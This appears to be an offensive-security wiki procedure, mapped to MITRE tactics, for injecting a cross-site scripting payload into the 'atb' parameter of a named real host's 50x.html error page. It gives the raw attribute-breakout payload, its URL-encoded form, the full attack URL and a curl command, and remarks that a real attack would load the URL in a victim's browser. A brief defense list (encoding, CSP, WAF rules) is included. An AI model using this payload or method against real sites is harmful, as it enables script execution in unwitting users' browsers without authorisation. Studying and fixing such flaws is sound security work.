---
id: proc-inject-xss-atb
tags:
  - xss
  - payload-injection
  - dom-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:37.510Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-ATB-Parameter

## Summary

This procedure crafts and injects a DOM XSS payload into the 'atb' URL parameter on the target error page to break out of an HTML attribute and execute JavaScript.

## Description

The 50x.html page on proxy.duckduckgo.com inserts the 'atb' value into an attribute without proper escaping, allowing a payload like test"/><img src=x onerror=alert('test');> to close the attribute, inject an <img> tag, and trigger onerror to run alert('test'). This executes in the victim's browser context.

## Requirements

1. Vulnerable endpoint confirmed
2. URL encoding knowledge for payloads
3. Browser for execution testing

## Defense

Defensive measures and detection strategies:

- HTML-encode attribute values
- Content Security Policy (CSP) to block inline scripts
- WAF rules for XSS payloads in error pages

## Objectives

1. Achieve attribute breakout
2. Execute arbitrary JavaScript
3. Demonstrate impact like alerts

## Instructions

### Step 1: Encode and Construct Payload

**Context**: URL-encode the breakout string to form the full URL.

The raw payload is: test"/><img src=x onerror=alert('test');>

Encoded: test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E

### Step 2: Load the Payload URL

**Context**: Inject via URL to trigger execution.

Execute [[commands/curl-test-xss]] or load in browser: https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E

```bash
curl -s "https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E" > /dev/null && echo "Check browser for alert"
```

> This fetches the page; in a real attack, load in victim's browser. Expected output: Alert pops up on load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss]]

## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[dom-xss]]
